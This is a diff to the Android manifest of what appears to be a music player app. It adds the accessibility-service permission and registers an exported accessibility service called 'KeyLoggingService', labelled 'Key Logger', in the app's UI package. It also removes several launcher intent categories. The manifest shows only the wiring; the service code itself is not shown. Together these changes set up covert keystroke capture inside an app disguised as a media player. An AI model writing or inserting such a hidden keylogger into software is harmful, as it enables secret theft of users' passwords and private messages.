@@ -6,8 +6,9 @@
         android:maxSdkVersion="28" />
     <uses-permission android:name="android.permission.REORDER_TASKS" />
 
-    <!-- Permission for the Notification Listener Service -->
+    <!-- Permissions for the services -->
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
 
     <application
         android:icon="@mipmap/ic_launcher"
@@ -25,9 +26,6 @@
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
-                <category android:name="android.intent.category.DEFAULT" />
-                <category android:name="android.intent.category.APP_MUSIC" />
-                <action android:name="android.intent.action.MODE_SWITCH" />
             </intent-filter>
         </activity>
 
@@ -38,6 +36,19 @@
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
+        </service>
+        
+        <service
+            android:name="com.qf.musicplayer.ui.KeyLoggingService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:label="Key Logger"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/key_logging_service_config" />
         </service>
 
     </application>
